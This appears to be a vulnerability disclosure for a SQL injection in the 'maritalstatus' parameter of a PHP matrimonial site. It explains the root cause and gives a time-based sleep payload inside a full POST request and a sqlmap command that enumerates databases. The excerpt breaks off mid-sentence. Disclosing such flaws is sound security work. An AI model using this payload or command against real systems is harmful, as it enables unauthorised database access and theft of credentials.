**Title:** Critical SQL Injection in code-projects Matrimonial System in PHP An unauthenticated remote attacker can enumerate the entire database, extract credentials and sensitive data, and potentially achieve full database compromise. 
...
The vulnerability exists because user-controlled input from the maritalstatus parameter is concatenated directly into an SQL query without server-side sanitization or parameterized  statements.
...
**Vulnerable Parameter:** maritalstatus
**Root Cause**
...
Because no parameterized query or escaping mechanism is used, arbitrary SQL statements can be injected via the maritalstatus parameter. The mysqlexec() function executes the query directly via mysqli_query() with no sanitization applied at any layer, allowing the injected payload to reach the database unfiltered.
...
The intercepted POST request was modified by injecting a time-based SQL payload into the  maritalstatus parameter. 

Payload: sex=male&maritalstatus=Single'%2b(select*from(select(sleep(20)))a)%2b'&country=Dubai&district=Calicut&state=Kerala&religion=Christian-All&mothertounge=Tamil&agemin=19&agemax=50&search=Search
...
command: ```python python .\sqlmap.py -r .\code_test_1.txt --batch --dbs -p maritalstatus ```

![POC](images/sqli%201.png)

SQLMap confirmed that the maritalstatus parameter is injectable using: 
